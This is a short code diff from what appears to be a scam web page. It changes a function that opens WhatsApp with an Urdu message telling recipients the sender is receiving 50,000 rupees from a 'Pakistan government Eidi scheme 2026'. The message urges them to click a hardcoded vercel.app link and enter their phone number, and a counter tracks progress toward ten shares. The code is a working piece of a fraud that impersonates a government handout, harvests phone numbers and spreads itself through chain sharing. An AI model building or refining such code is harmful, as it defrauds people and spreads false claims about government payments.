@@ -89,7 +89,7 @@ function shareWa() {
     document.getElementById('shareCount').innerText = `${shareCount}/10 تکمیل`;
     
     // Dynamic sharing text
-    const shareText = encodeURIComponent(`🌙 عید مبارک! ✨ \n\nمجھے پاکستان حکومت کی عیدی اسکیم 2026 سے 50,000 روپے مل رہے ہیں! 😍 \n\nاگر آپ بھی عیدی حاصل کرنا چاہتے ہیں تو ابھی اس لنک پر کلک کریں اور اپنا نمبر درج کریں: \n\n${window.location.href}`);
+    const shareText = encodeURIComponent(`🌙 عید مبارک! ✨ \n\nمجھے پاکستان حکومت کی عیدی اسکیم 2026 سے 50,000 روپے مل رہے ہیں! 😍 \n\nاگر آپ بھی عیدی حاصل کرنا چاہتے ہیں تو ابھی اس لنک پر کلک کریں اور اپنا نمبر درج کریں: \n\nhttps://eidigift2026-pk.vercel.app`);
     
     window.open(`whatsapp://send?text=${shareText}`, '_blank');
     
